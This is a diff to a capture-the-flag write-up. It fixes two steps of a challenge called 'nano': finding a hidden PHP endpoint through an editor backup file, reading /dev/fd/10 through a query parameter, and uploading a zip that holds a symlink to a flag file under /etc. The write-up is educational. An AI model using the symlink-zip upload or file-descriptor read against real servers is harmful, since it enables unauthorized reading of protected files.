@@ -135,7 +135,7 @@ if __name__ == "__main__":
 Flag -> `MUCTF{P455w0rd5_mu57_b3_l0n6_4nd_c0mpl3x_l1k3_2MWn&p#FmjShTZXfAg:)}`
 
 ## Challenge nano
-Step 1: `/index.html` -> get path `/801910ad8658876d56f5c8b24a563096.php` (view-source)
+Step 1: `/index.html~` -> get path `/801910ad8658876d56f5c8b24a563096.php` (view-source)
 
 Step 2: `/801910ad8658876d56f5c8b24a563096.php?flag_help=/dev/fd/10` -> get path `/ffc14c6eb03e852ea2d2cbe18b3f4d76.php`
 
@@ -143,7 +143,7 @@ Step 3: `/ffc14c6eb03e852ea2d2cbe18b3f4d76.php` and upload zip
 
 Gen zip
 ```
-ls -s /etc/ff3efa4307078c85678c6adee3b5f1b1af2ba16e/nanoflag/flag.txt payload
+ln -s /etc/ff3efa4307078c85678c6adee3b5f1b1af2ba16e/nanoflag/flag.txt payload
 
 zip --symlinks payload.zip payload
 ```
